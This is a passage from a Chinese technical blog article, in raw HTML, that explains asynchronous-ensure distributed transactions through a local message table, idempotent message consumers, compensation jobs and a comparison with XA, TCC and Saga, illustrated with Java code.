                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>面试官</strong>："请详细解释异步确保型事务的原理，并说明如何通过消息队列实现分布式事务的最终一致性？"</p>
</blockquote>
<p>异步确保型事务是现代分布式系统中解决数据一致性问题的重要模式，通过将同步阻塞操作改为异步执行，显著提升系统性能。</p>
<h2 data-id="heading-0">一、核心原理与架构思想</h2>
<p><strong>异步确保型事务定义</strong>：</p>
<blockquote>
<p>通过消息队列的可靠性保证，将一系列同步的事务操作修改为基于消息队列异步执行的操作，避免分布式事务中同步阻塞带来的性能下降，同时确保数据的最终一致性。</p>
</blockquote>
<p><strong>架构演进对比</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 同步阻塞模式（改造前）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncTransactionService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processOrder</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-comment">// 1. 创建订单（数据库操作）</span>
        orderDao.<span class="hljs-title function_">insert</span>(order); <span class="hljs-comment">// 阻塞</span>
        
        <span class="hljs-comment">// 2. 扣减库存（远程调用）</span>
        inventoryService.<span class="hljs-title function_">reduceStock</span>(order); <span class="hljs-comment">// 网络IO阻塞</span>
        
        <span class="hljs-comment">// 3. 增加积分（远程调用）  </span>
        pointsService.<span class="hljs-title function_">addPoints</span>(order); <span class="hljs-comment">// 网络IO阻塞</span>
        
        <span class="hljs-comment">// 总耗时：订单+库存+积分操作耗时之和</span>
        <span class="hljs-comment">// 性能瓶颈：同步阻塞，资源锁定时间长</span>
    }
}

<span class="hljs-comment">// 异步确保模式（改造后）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncEnsureService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">MessageQueue</span> mq;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processOrderAsync</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-comment">// 1. 创建订单（本地事务）</span>
        orderDao.<span class="hljs-title function_">insert</span>(order); <span class="hljs-comment">// 快速完成</span>
        
        <span class="hljs-comment">// 2. 发送消息（本地事务内）</span>
        mq.<span class="hljs-title function_">sendAsync</span>(<span class="hljs-string">"order_created"</span>, order); <span class="hljs-comment">// 异步非阻塞</span>
        
        <span class="hljs-comment">// 总耗时：仅订单创建时间</span>
        <span class="hljs-comment">// 性能优势：快速释放资源，异步处理后续操作</span>
    }
}
</code></pre>
<h2 data-id="heading-1">二、核心实现模式：本地消息表</h2>
<p><strong>本地消息表方案架构</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/**
 * 本地消息表实现
 * 通过数据库事务保证业务操作和消息存储的原子性
 */</span>
<span class="hljs-keyword">@Service</span>
<span class="hljs-keyword">@Transactional</span>
public class LocalMessageTableService {
    
    <span class="hljs-keyword">@Autowired</span>
    private OrderDao orderDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageQueue messageQueue;
    
    <span class="hljs-comment">/**
     * 创建订单并保存消息（原子操作）
     */</span>
    public void <span class="hljs-built_in">createOrderWithMessage</span>(Order order) {
        <span class="hljs-comment">// 1. 业务操作：创建订单</span>
        orderDao<span class="hljs-selector-class">.insert</span>(order);
        
        <span class="hljs-comment">// 2. 同一事务：保存消息到本地表</span>
        TransactionalMessage message = new <span class="hljs-built_in">TransactionalMessage</span>();
        message<span class="hljs-selector-class">.setMessageId</span>(generateId());
        message<span class="hljs-selector-class">.setTopic</span>("order_created");
        message<span class="hljs-selector-class">.setContent</span>(order.toJson());
        message<span class="hljs-selector-class">.setStatus</span>(MessageStatus.PENDING);
        message<span class="hljs-selector-class">.setCreateTime</span>(new Date());
        message<span class="hljs-selector-class">.setRetryCount</span>(<span class="hljs-number">0</span>);
        
        messageDao<span class="hljs-selector-class">.insert</span>(message);
        
        <span class="hljs-comment">// 事务提交后，消息和订单数据同时持久化</span>
    }
    
    <span class="hljs-comment">/**
     * 异步消息发送任务
     */</span>
    <span class="hljs-keyword">@Scheduled</span>(fixedDelay = <span class="hljs-number">5000</span>) // 每<span class="hljs-number">5</span>秒执行一次
    public void sendPendingMessages() {
        List&lt;TransactionalMessage&gt; pendingMessages = 
            messageDao<span class="hljs-selector-class">.findByStatus</span>(MessageStatus.PENDING, <span class="hljs-number">100</span>);
        
        for (TransactionalMessage message : pendingMessages) {
            try {
                <span class="hljs-comment">// 发送消息到MQ</span>
                boolean success = messageQueue<span class="hljs-selector-class">.send</span>(
                    message.getTopic(), 
                    message<span class="hljs-selector-class">.getContent</span>()
                );
                
                if (success) {
                    <span class="hljs-comment">// 更新消息状态为已发送</span>
                    message<span class="hljs-selector-class">.setStatus</span>(MessageStatus.SENT);
                    message<span class="hljs-selector-class">.setSendTime</span>(new Date());
                    messageDao<span class="hljs-selector-class">.update</span>(message);
                } else {
                    <span class="hljs-comment">// 发送失败，增加重试次数</span>
                    message<span class="hljs-selector-class">.setRetryCount</span>(message.getRetryCount() + <span class="hljs-number">1</span>);
                    if (message.getRetryCount() &gt; MAX_RETRY) {
                        message<span class="hljs-selector-class">.setStatus</span>(MessageStatus.FAILED);
                    }
                    messageDao<span class="hljs-selector-class">.update</span>(message);
                }
                
            } catch (Exception e) {
                log<span class="hljs-selector-class">.error</span>("消息发送失败: {}", message.getMessageId(), e);
                <span class="hljs-built_in">handleSendError</span>(message, e);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-2">三、消息消费端的可靠性保证</h2>
<p><strong>幂等性消费实现</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 消息消费者幂等性处理
 * 防止重复消费导致数据不一致
 */</span>
<span class="hljs-variable">@Service</span>
<span class="hljs-variable">@Slf4j</span>
public class OrderMessageConsumer {
    
    <span class="hljs-variable">@Autowired</span>
    private InventoryService inventoryService;
    
    <span class="hljs-variable">@Autowired</span>
    private ConsumeRecordDao consumeRecordDao;
    
    <span class="hljs-comment">/**
     * 处理订单创建消息（幂等）
     */</span>
    <span class="hljs-variable">@MessageListener</span>(topic = <span class="hljs-string">"order_created"</span>)
    public void <span class="hljs-built_in">handleOrderCreated</span>(String message) {
        <span class="hljs-selector-tag">Order</span> <span class="hljs-selector-tag">order</span> = <span class="hljs-selector-tag">parseOrder</span>(message);
        
        <span class="hljs-comment">// 检查是否已处理过（幂等性校验）</span>
        <span class="hljs-selector-tag">if</span> (consumeRecordDao.<span class="hljs-built_in">isProcessed</span>(order.<span class="hljs-built_in">getOrderId</span>(), <span class="hljs-string">"order_created"</span>)) {
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.warn</span>(<span class="hljs-string">"消息已处理，跳过重复消费: orderId={}"</span>, order.<span class="hljs-built_in">getOrderId</span>());
            <span class="hljs-selector-tag">return</span>;
        }
        
        <span class="hljs-selector-tag">try</span> {
            <span class="hljs-comment">// 执行库存扣减</span>
            <span class="hljs-selector-tag">inventoryService</span><span class="hljs-selector-class">.reduceStock</span>(order.<span class="hljs-built_in">getProductId</span>(), order.<span class="hljs-built_in">getQuantity</span>());
            
            <span class="hljs-comment">// 记录消费成功</span>
            <span class="hljs-selector-tag">consumeRecordDao</span><span class="hljs-selector-class">.recordProcessed</span>(
                order.<span class="hljs-built_in">getOrderId</span>(), 
                <span class="hljs-string">"order_created"</span>, 
                message
            );
            
        } <span class="hljs-selector-tag">catch</span> (Exception e) {
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"处理订单消息失败: orderId={}"</span>, order.<span class="hljs-built_in">getOrderId</span>(), e);
            <span class="hljs-comment">// 抛出异常让消息队列重试</span>
            <span class="hljs-selector-tag">throw</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">RuntimeException</span>(<span class="hljs-string">"处理失败"</span>, e);
        }
    }
    
    <span class="hljs-comment">/**
     * 库存服务幂等实现
     */</span>
    @<span class="hljs-selector-tag">Service</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">InventoryService</span> {
        
        <span class="hljs-variable">@Transactional</span>
        public void <span class="hljs-built_in">reduceStock</span>(Long productId, Integer quantity) {
            <span class="hljs-comment">// 使用版本号或状态字段实现幂等</span>
            <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">affected</span> = <span class="hljs-selector-tag">inventoryDao</span><span class="hljs-selector-class">.reduceStockWithVersion</span>(
                productId, quantity, <span class="hljs-built_in">getCurrentVersion</span>(productId));
            
            <span class="hljs-selector-tag">if</span> (affected == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// 可能已经扣减过，记录日志并跳过</span>
                <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span class="hljs-string">"库存可能已扣减: productId={}"</span>, productId);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-3">四、完整的事务补偿机制</h2>
<p><strong>消息补偿任务</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 消息补偿服务
 * 处理发送失败和消费失败的消息
 */</span>
<span class="hljs-variable">@Component</span>
<span class="hljs-variable">@Slf4j</span>
public class MessageCompensationService {
    
    <span class="hljs-variable">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-variable">@Autowired</span>
    private MessageQueue messageQueue;
    
    <span class="hljs-variable">@Autowired</span>
    private AlertService alertService;
    
    <span class="hljs-comment">/**
     * 重试发送失败的消息
     */</span>
    <span class="hljs-variable">@Scheduled</span>(fixedDelay = <span class="hljs-number">60000</span>) <span class="hljs-comment">// 每1分钟执行一次</span>
    public void <span class="hljs-built_in">retryFailedMessages</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt; <span class="hljs-selector-tag">failedMessages</span> = 
            <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.findByStatus</span>(MessageStatus.FAILED, <span class="hljs-number">50</span>);
        
        <span class="hljs-selector-tag">for</span> (TransactionalMessage <span class="hljs-attribute">message </span>: failedMessages) {
            <span class="hljs-selector-tag">if</span> (message.<span class="hljs-built_in">getRetryCount</span>() &lt; MAX_MANUAL_RETRY) {
                <span class="hljs-selector-tag">try</span> {
                    <span class="hljs-selector-tag">boolean</span> <span class="hljs-selector-tag">success</span> = <span class="hljs-selector-tag">messageQueue</span><span class="hljs-selector-class">.send</span>(
                        message.<span class="hljs-built_in">getTopic</span>(), 
                        message.<span class="hljs-built_in">getContent</span>()
                    );
                    
                    <span class="hljs-selector-tag">if</span> (success) {
                        <span class="hljs-selector-tag">message</span><span class="hljs-selector-class">.setStatus</span>(MessageStatus.SENT);
                        <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.update</span>(message);
                    }
                    
                } <span class="hljs-selector-tag">catch</span> (Exception e) {
                    <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"重试发送仍失败: {}"</span>, message.<span class="hljs-built_in">getMessageId</span>(), e);
                }
            } <span class="hljs-selector-tag">else</span> {
                <span class="hljs-comment">// 超过最大重试次数，需要人工干预</span>
                <span class="hljs-selector-tag">alertService</span><span class="hljs-selector-class">.alertManualIntervention</span>(
                    <span class="hljs-string">"消息发送失败需要处理"</span>, 
                    message
                );
            }
        }
    }
    
    <span class="hljs-comment">/**
     * 处理死信消息
     */</span>
    @<span class="hljs-selector-tag">Scheduled</span>(fixedDelay = <span class="hljs-number">300000</span>) <span class="hljs-comment">// 每5分钟执行一次</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">handleDeadLetterMessages</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">DeadLetterMessage</span>&gt; <span class="hljs-selector-tag">deadLetters</span> = 
            <span class="hljs-selector-tag">messageQueue</span><span class="hljs-selector-class">.getDeadLetters</span>();
        
        <span class="hljs-selector-tag">for</span> (DeadLetterMessage <span class="hljs-attribute">deadLetter </span>: deadLetters) {
            <span class="hljs-comment">// 记录到数据库供人工处理</span>
            <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.saveDeadLetter</span>(deadLetter);
            <span class="hljs-selector-tag">alertService</span><span class="hljs-selector-class">.alertManualIntervention</span>(
                <span class="hljs-string">"死信消息需要处理"</span>, 
                deadLetter
            );
        }
    }
}
</code></pre>
<h2 data-id="heading-4">五、性能优化与最佳实践</h2>
<p><strong>批量消息处理优化</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 批量消息处理优化
 * 减少数据库IO和网络开销
 */</span>
<span class="hljs-variable">@Service</span>
<span class="hljs-variable">@Slf4j</span>
public class BatchMessageService {
    
    <span class="hljs-variable">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-variable">@Autowired</span>
    private MessageQueue messageQueue;
    
    <span class="hljs-comment">/**
     * 批量发送消息
     */</span>
    <span class="hljs-variable">@Scheduled</span>(fixedDelay = <span class="hljs-number">10000</span>) <span class="hljs-comment">// 每10秒执行一次</span>
    public void <span class="hljs-built_in">batchSendMessages</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt; <span class="hljs-selector-tag">pendingMessages</span> = 
            <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.findByStatus</span>(MessageStatus.PENDING, <span class="hljs-number">500</span>);
        
        <span class="hljs-selector-tag">if</span> (pendingMessages.<span class="hljs-built_in">isEmpty</span>()) {
            <span class="hljs-selector-tag">return</span>;
        }
        
        <span class="hljs-comment">// 按Topic分组批量发送</span>
        <span class="hljs-selector-tag">Map</span>&lt;<span class="hljs-selector-tag">String</span>, <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt;&gt; <span class="hljs-selector-tag">messagesByTopic</span> = 
            <span class="hljs-selector-tag">pendingMessages</span><span class="hljs-selector-class">.stream</span>()
                <span class="hljs-selector-class">.collect</span>(Collectors.<span class="hljs-built_in">groupingBy</span>(<span class="hljs-attribute">TransactionalMessage</span>::getTopic));
        
        <span class="hljs-selector-tag">for</span> (Map.Entry&lt;String, List&lt;TransactionalMessage&gt;&gt; <span class="hljs-attribute">entry </span>: 
             messagesByTopic.<span class="hljs-built_in">entrySet</span>()) {
            
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">topic</span> = <span class="hljs-selector-tag">entry</span><span class="hljs-selector-class">.getKey</span>();
            <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TransactionalMessage</span>&gt; <span class="hljs-selector-tag">messages</span> = <span class="hljs-selector-tag">entry</span><span class="hljs-selector-class">.getValue</span>();
            
            <span class="hljs-selector-tag">try</span> {
                <span class="hljs-comment">// 批量发送</span>
                <span class="hljs-selector-tag">boolean</span> <span class="hljs-selector-tag">success</span> = <span class="hljs-selector-tag">messageQueue</span><span class="hljs-selector-class">.sendBatch</span>(
                    topic, 
                    messages.<span class="hljs-built_in">stream</span>()
                        .<span class="hljs-built_in">map</span>(<span class="hljs-attribute">TransactionalMessage</span>::getContent)
                        .<span class="hljs-built_in">collect</span>(Collectors.<span class="hljs-built_in">toList</span>())
                );
                
                <span class="hljs-selector-tag">if</span> (success) {
                    <span class="hljs-comment">// 批量更新状态</span>
                    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Long</span>&gt; <span class="hljs-selector-tag">messageIds</span> = <span class="hljs-selector-tag">messages</span><span class="hljs-selector-class">.stream</span>()
                        <span class="hljs-selector-class">.map</span>(<span class="hljs-attribute">TransactionalMessage</span>::getMessageId)
                        <span class="hljs-selector-class">.collect</span>(Collectors.<span class="hljs-built_in">toList</span>());
                    
                    <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.batchUpdateStatus</span>(
                        messageIds, 
                        MessageStatus.SENT
                    );
                }
                
            } <span class="hljs-selector-tag">catch</span> (Exception e) {
                <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"批量发送失败: topic={}"</span>, topic, e);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-5">六、与其它分布式事务方案对比</h2>
<p><strong>方案对比分析</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 分布式事务方案比较
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionSolutionComparator</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">compareSolutions</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 性能对比</span>
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; tpsComparison = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">of</span>(
            <span class="hljs-string">"XA/2PC"</span>, <span class="hljs-number">100</span>,      <span class="hljs-comment">// 低性能</span>
            <span class="hljs-string">"TCC"</span>,    <span class="hljs-number">1000</span>,     <span class="hljs-comment">// 中等性能  </span>
            <span class="hljs-string">"Saga"</span>,   <span class="hljs-number">2000</span>,     <span class="hljs-comment">// 中高性能</span>
            <span class="hljs-string">"异步确保"</span>, <span class="hljs-number">5000</span>      <span class="hljs-comment">// 高性能</span>
        );
        
        <span class="hljs-comment">// 一致性对比</span>
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; consistencyComparison = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">of</span>(
            <span class="hljs-string">"XA/2PC"</span>, <span class="hljs-string">"强一致性"</span>,
            <span class="hljs-string">"TCC"</span>,    <span class="hljs-string">"最终一致性"</span>,
            <span class="hljs-string">"Saga"</span>,   <span class="hljs-string">"最终一致性"</span>, 
            <span class="hljs-string">"异步确保"</span>, <span class="hljs-string">"最终一致性"</span>
        );
        
        <span class="hljs-comment">// 复杂度对比</span>
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; complexityComparison = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">of</span>(
            <span class="hljs-string">"XA/2PC"</span>, <span class="hljs-string">"低（数据库支持）"</span>,
            <span class="hljs-string">"TCC"</span>,    <span class="hljs-string">"高（业务侵入）"</span>,
            <span class="hljs-string">"Saga"</span>,   <span class="hljs-string">"中（补偿逻辑）"</span>,
            <span class="hljs-string">"异步确保"</span>, <span class="hljs-string">"中（消息管理）"</span>
        );
    }
}
</code></pre>
<p><strong>选型决策指南</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolutionSelector</span> {
    <span class="hljs-keyword">public</span> String selectSolution(Requirement req) {
        <span class="hljs-keyword">if</span> (req.isFinancial() &amp;&amp; req.needStrongConsistency()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"XA/2PC"</span>; <span class="hljs-comment">// 金融交易</span>
        }
        
        <span class="hljs-keyword">if</span> (req.isHighConcurrency() &amp;&amp; req.canAcceptEventualConsistency()) {
            <span class="hljs-keyword">if</span> (req.hasComplexCompensation()) {
                <span class="hljs-keyword">return</span> <span class="hljs-string">"TCC"</span>; <span class="hljs-comment">// 需要精确补偿</span>
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"异步确保"</span>; <span class="hljs-comment">// 高并发场景首选</span>
        }
        
        <span class="hljs-keyword">if</span> (req.isLongRunning()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"Saga"</span>; <span class="hljs-comment">// 长业务流程</span>
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"异步确保"</span>; <span class="hljs-comment">// 默认选择</span>
    }
}
</code></pre>
<h2 data-id="heading-6">七、实际应用场景案例</h2>
<p><strong>电商下单场景实现</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/**
 * 电商下单异步确保实现
 */</span>
<span class="hljs-keyword">@Service</span>
<span class="hljs-keyword">@Slf</span>4j
public class EcommerceOrderService {
    
    <span class="hljs-keyword">@Autowired</span>
    private OrderDao orderDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageSender messageSender;
    
    <span class="hljs-keyword">@Transactional</span>
    public OrderResult createOrder(OrderRequest request) {
        <span class="hljs-comment">// 1. 参数校验</span>
        <span class="hljs-built_in">validateRequest</span>(request);
        
        <span class="hljs-comment">// 2. 创建订单（本地事务）</span>
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = <span class="hljs-built_in">createOrderEntity</span>(request);
        orderDao<span class="hljs-selector-class">.insert</span>(order);
        
        <span class="hljs-comment">// 3. 保存消息（同一事务）</span>
        TransactionalMessage message = <span class="hljs-built_in">createOrderMessage</span>(order);
        messageDao<span class="hljs-selector-class">.insert</span>(message);
        
        <span class="hljs-comment">// 4. 返回结果（事务提交前）</span>
        return new <span class="hljs-built_in">OrderResult</span>(order.getOrderId(), "订单创建成功");
        
        <span class="hljs-comment">// 事务提交后，异步任务会发送消息触发后续操作</span>
    }
    
    <span class="hljs-comment">/**
     * 消息处理器：库存扣减
     */</span>
    <span class="hljs-keyword">@MessageListener</span>(topic = <span class="hljs-string">"order_created"</span>)
    public void handleInventoryDeduction(String message) {
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = <span class="hljs-built_in">parseOrder</span>(message);
        
        try {
            <span class="hljs-comment">// 扣减库存</span>
            inventoryService<span class="hljs-selector-class">.deductStock</span>(
                order.getProductId(), 
                <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getQuantity</span>()
            );
            
            <span class="hljs-comment">// 发送库存扣减成功消息</span>
            messageSender<span class="hljs-selector-class">.send</span>("inventory_deducted", order);
            
        } catch (Exception e) {
            log<span class="hljs-selector-class">.error</span>("库存扣减失败: orderId={}", order.getOrderId(), e);
            <span class="hljs-comment">// 重试或补偿处理</span>
            <span class="hljs-built_in">handleInventoryFailure</span>(order, e);
        }
    }
    
    <span class="hljs-comment">/**
     * 消息处理器：积分增加
     */</span>
    <span class="hljs-keyword">@MessageListener</span>(topic = <span class="hljs-string">"inventory_deducted"</span>)  
    public void handlePointsAddition(String message) {
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = <span class="hljs-built_in">parseOrder</span>(message);
        
        try {
            <span class="hljs-comment">// 增加积分</span>
            pointsService<span class="hljs-selector-class">.addPoints</span>(
                order.getUserId(), 
                <span class="hljs-built_in">calculatePoints</span>(order.getAmount())
            );
            
            <span class="hljs-comment">// 订单流程完成</span>
            orderService<span class="hljs-selector-class">.completeOrder</span>(order.getOrderId());
            
        } catch (Exception e) {
            log<span class="hljs-selector-class">.error</span>("积分增加失败: orderId={}", order.getOrderId(), e);
            <span class="hljs-comment">// 重试或补偿处理</span>
            <span class="hljs-built_in">handlePointsFailure</span>(order, e);
        }
    }
}
</code></pre>
<h2 data-id="heading-7">八、常见问题与解决方案</h2>
<p><strong>消息可靠性保障</strong>：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">/**
 * 消息可靠性解决方案
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageReliabilitySolution</span> {
    
    <span class="hljs-comment">// 问题1：消息丢失</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveMessageLoss</span>()</span> {
        <span class="hljs-comment">// 方案：本地消息表 + 定时任务重试</span>
        <span class="hljs-comment">// 方案：生产者确认机制</span>
        <span class="hljs-comment">// 方案：消息持久化存储</span>
    }
    
    <span class="hljs-comment">// 问题2：消息重复</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveMessageDuplicate</span>()</span> {
        <span class="hljs-comment">// 方案：消费者幂等性处理</span>
        <span class="hljs-comment">// 方案：唯一消息ID去重</span>
        <span class="hljs-comment">// 方案：消费状态记录</span>
    }
    
    <span class="hljs-comment">// 问题3：消息顺序</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveMessageOrder</span>()</span> {
        <span class="hljs-comment">// 方案：单一分区消费</span>
        <span class="hljs-comment">// 方案：版本号或序列号控制</span>
        <span class="hljs-comment">// 方案：业务层排序处理</span>
    }
    
    <span class="hljs-comment">// 问题4：系统复杂度</span>
